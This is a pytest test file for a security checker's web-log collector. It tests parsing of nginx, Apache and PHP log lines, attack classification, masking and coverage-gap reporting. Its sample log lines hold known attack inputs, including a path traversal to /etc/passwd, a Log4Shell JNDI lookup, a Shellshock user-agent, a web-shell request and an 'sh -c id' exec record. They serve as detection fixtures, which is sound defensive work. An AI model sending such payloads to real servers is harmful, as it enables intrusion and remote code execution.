"""Web applications, collection and parsing (PR 2.8a, DESIGN.md §8.12)."""

from zoneinfo import ZoneInfo

import pytest

from checker.cli import main
from checker.events import EventBuilder
from checker.evidence import load_config
from checker.protocol import Limits, Record, Settings, SourceStart


def web_source(source_id, name):
    return SourceStart(
        type="source_start", source_id=source_id, module="web_logs", kind="file", name=name, meta={}
    )


ACCESS = [
    # Ordinary: counted, not kept.
    '203.0.113.9 - - [28/Oct/2026:10:00:01 +0000] "GET /index.html HTTP/1.1" 200 512 "-" "x"',
    '203.0.113.10 - - [28/Oct/2026:10:00:01 +0000] "GET /nope HTTP/1.1" 404 0 "-" "x"',
    # A script, a server error, an attack marker: kept.
    '203.0.113.9 - - [28/Oct/2026:10:00:02 +0000] "POST /up/shell.php?c=[MASKED:value] HTTP/1.1"'
    ' 200 12 "-" "curl/8"',
    '198.51.100.7 - bob [28/Oct/2026:10:00:03 +0000] "GET /api HTTP/1.1" 502 0 "-" "x"',
    '198.51.100.7 - - [28/Oct/2026:10:00:04 +0000] "GET /x?f=[MASKED:exploit:traversal] HTTP/1.1"'
    ' 404 0 "-" "x"',
    "not a log line at all",
]


def test_access_lines_kept_or_counted():
    builder = EventBuilder()
    for line in ACCESS:
        builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
    kept = [(e.fields["path"], e.fields["status"]) for e in builder.events]
    assert kept == [
        ("/up/shell.php?c=[MASKED:value]", 200),
        ("/api", 502),
        ("/x?f=[MASKED:exploit:traversal]", 404),
    ]
    shell, _, attack = builder.events
    assert shell.type == "web.request" and shell.fields["method"] == "POST"
    assert shell.fields["network"] == "203.0.113.0/24" and shell.time == "2026-10-28T10:00:02+00:00"
    assert attack.fields["attacks"] == ["traversal"]
    summary = builder.web.summary()
    assert summary["requests_by_network"] == {"203.0.113.0/24": {"2xx": 1, "4xx": 1}}
    assert summary["unparsed"] == {"/var/log/nginx/access.log": 1}
    assert summary["lines"] == {"/var/log/nginx/access.log": 6}


@pytest.mark.parametrize(
    ("line", "level", "client", "time"),
    [
        (
            "2026/10/28 10:00:03 [error] 77#77: *5 open() failed, client: 198.51.100.4,"
            ' server: x, request: "GET /a.php?id=[MASKED:value] HTTP/1.1"',
            "error",
            "198.51.100.4",
            "2026-10-28T09:00:03+00:00",
        ),
        (
            "[Wed Oct 28 10:00:03.123456 2026] [php:error] [pid 812] [client 198.51.100.4:5123]"
            " PHP Fatal error: x",
            "error",
            "198.51.100.4",
            "2026-10-28T09:00:03.123456+00:00",
        ),
        (
            "[28-Oct-2026 10:00:03] WARNING: [pool www] child 9 said into stderr: x",
            "warning",
            None,
            "2026-10-28T09:00:03+00:00",
        ),
    ],
)
def test_error_lines_in_the_host_s_zone(line, level, client, time):
    builder = EventBuilder()
    builder.zone = ZoneInfo("Europe/Berlin")
    builder.line(web_source(1, "/var/log/nginx/error.log"), line.encode() + b"\n")
    [event] = builder.events
    assert (event.type, event.fields["level"], event.fields.get("client"), event.time) == (
        "web.error",
        level,
        client,
        time,
    )
    if "request:" in line:
        assert event.fields["request"].startswith("GET /a.php")


def test_configuration_files_aren_t_log_lines():
    builder = EventBuilder()
    builder.line(web_source(1, "/etc/nginx/nginx.conf"), ACCESS[0].encode() + b"\n")
    assert builder.events == [] and builder.web.lines == {}


def test_program_starts_become_events():
    builder = EventBuilder()
    data = {
        "time": "2026-10-28T10:00:05+00:00",
        "pid": 901,
        "ppid": 900,
        "uid": 33,
        "euid": 33,
        "comm": "sh",
        "exe": "/usr/bin/dash",
        "cwd": "/var/www/html",
        "argv": "sh -c id",
        "success": "yes",
    }
    builder.record(Record(type="record", module="web_logs", name="exec_record", data=data))
    [event] = builder.events
    assert event.type == "process.exec" and event.source == "web_logs:audit"
    assert event.fields["argv"] == "sh -c id" and event.fields["success"] is True


def test_settings_and_init_choices(checker_home, capsys):
    from test_mail import T0

    limits = Limits(overall_seconds=1, module_seconds=1, source_bytes=1)
    settings = Settings(run_id="r", since=T0, limits=limits)
    assert (settings.web_access_logs, settings.exec_records, settings.web_users) == (
        False,
        "web",
        [],
    )
    with pytest.raises(ValueError):
        Settings(run_id="r", since=T0, limits=limits, web_users=["-bad"])
    assert main(["init", "--web-access-logs", "--exec-records", "privileged"]) == 0
    out = capsys.readouterr().out
    assert "Web access logs: collected, masked" in out
    assert "root, service and administrator accounts" in out
    config = load_config(checker_home)
    assert config.web_access_logs is True and config.exec_records == "privileged"


@pytest.fixture
def checker_home(tmp_path, monkeypatch):
    monkeypatch.setenv("CHECKER_HOME", str(tmp_path / "home"))
    return tmp_path / "home"


def test_coverage_says_what_web_data_is_missing():
    from test_checks_live import snap

    from checker.assess import web_gaps

    live = {
        "web_logs_summary": {"access_logs_opted_in": False, "access_found": 2},
        "exec_records_unavailable": {"reason": "no audit log"},
        "web_requests": {
            "lines": {"/var/log/x.log": 10, "/var/log/y.log": 10},
            "unparsed": {"/var/log/x.log": 9, "/var/log/y.log": 2},
        },
    }
    gaps = web_gaps(snap(live))
    assert any("not chosen at setup" in g for g in gaps)
    assert any("docs/auditd-web.rules" in g for g in gaps)
    assert [g for g in gaps if "not recognised" in g] == [
        "web log format not recognised: /var/log/x.log (9 lines)"
    ]
    opted = {"web_logs_summary": {"access_logs_opted_in": True, "access_found": 2}}
    assert web_gaps(snap(opted)) == []


HEAD = "1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "


@pytest.mark.parametrize(
    ("line", "field", "attacks"),
    [
        (HEAD + '"GET /../../etc/passwd HTTP/1.1" 200 5 "-" "x"', "attacks", ["traversal"]),
        (HEAD + '"GET / HTTP/1.1" 200 5 "-" "${jndi:ldap://e/a}"', "agent_attacks", ["jndi"]),
        (
            HEAD + '"GET /cgi HTTP/1.1" 404 5 "-" "() { :;}; /bin/id"',
            "agent_attacks",
            ["shellshock"],
        ),
        (HEAD + '"GET /.env HTTP/1.1" 200 5 "-" "x"', "attacks", []),
        (HEAD + '"GET /.git/config HTTP/1.1" 200 5 "-" "x"', "attacks", []),
    ],
)
def test_attacks_and_sensitive_files_are_kept(line, field, attacks):
    builder = EventBuilder()
    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
    [event] = builder.events
    # An attack in the user agent is kept apart: the request didn't carry it.
    assert event.fields.get(field, []) == attacks


def test_a_marker_in_the_user_agent_is_no_attack_and_not_kept():
    builder = EventBuilder()
    line = (
        '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 5 "-" "[MASKED:exploit:sql]"'
    )
    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
    assert builder.events == []
    line = '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /.env HTTP/1.1" 404 5 "-" "x"'
    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
    assert builder.events == []  # refused: nothing served


def test_an_attack_name_the_collector_never_writes_is_not_passed_on():
    builder = EventBuilder()
    line = (
        '1.2.3.4 - - [28/Oct/2026:10:00:01 +0000] "GET /x?a=[MASKED:exploit:approved_scan_ignore]'
        ' HTTP/1.1" 200 5 "-" "x"'
    )
    builder.line(web_source(1, "/var/log/nginx/access.log"), line.encode() + b"\n")
    assert builder.events[0].fields["attacks"] == ["unrecognised"]


def test_clients_with_ports_and_mapped_addresses():
    from checker.events import _client_address, _network

    assert _client_address("[2001:db8::1]:5678") == "2001:db8::1"
    assert _client_address("2001:db8:1:2:3:4:5:6:51234") == "2001:db8:1:2:3:4:5:6"
    assert _client_address("198.51.100.4:5123") == "198.51.100.4"
    assert _network("2001:db8:1:2:3:4:5:6:51234") == "2001:db8:1::/48"
    assert _network("::ffff:198.51.100.4") == "198.51.100.0/24"


def test_an_audit_log_without_program_starts_is_a_gap():
    from test_checks_live import snap

    from checker.assess import web_gaps

    gaps = web_gaps(snap({"exec_records_summary": {"starts": 0}}))
    assert any("auditd isn't recording them" in g for g in gaps)
    assert web_gaps(snap({"exec_records_summary": {"starts": 3}})) == []


def test_web_users_are_checked_in_the_configuration():
    from checker.evidence import Config

    with pytest.raises(ValueError):
        Config(recipients=["x"], web_users=["-bad"])
    assert Config(recipients=["x"], web_users=["deploy@corp.example"]).web_users
